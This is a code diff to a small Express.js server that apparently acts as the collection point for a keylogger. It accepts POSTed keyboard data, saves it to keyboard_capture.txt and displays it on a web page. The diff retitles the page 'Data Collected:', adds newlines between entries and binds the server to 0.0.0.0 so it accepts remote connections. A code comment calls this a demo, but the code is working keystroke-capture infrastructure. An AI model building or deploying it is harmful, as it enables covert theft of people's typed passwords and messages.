@@ -23,7 +23,7 @@ app.get("/", (req, res) => {
     try {
         const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
         // We send the txt file data to the server. We replace the "\n" with <br> 
-        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
+        res.send(`<h1>Data Collected: </h1><p>${kl_file.replace("\n", "<br>")}</p>`);
     } catch {
         res.send("<h1>Nothing logged yet.</h1>");
     }  
@@ -34,10 +34,10 @@ app.post("/", (req, res) => {
     // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
     console.log(req.body.keyboardData);
     // Will now write the keyboard capture to a text file.
-    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
+    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData + "\n");
     res.send("Successfully set the data");
 });
 // We can see that the app is listening on which port.
-app.listen(port, () => {
+app.listen(port, "0.0.0.0", () => {
     console.log(`App is listening on port ${port}`);
 });
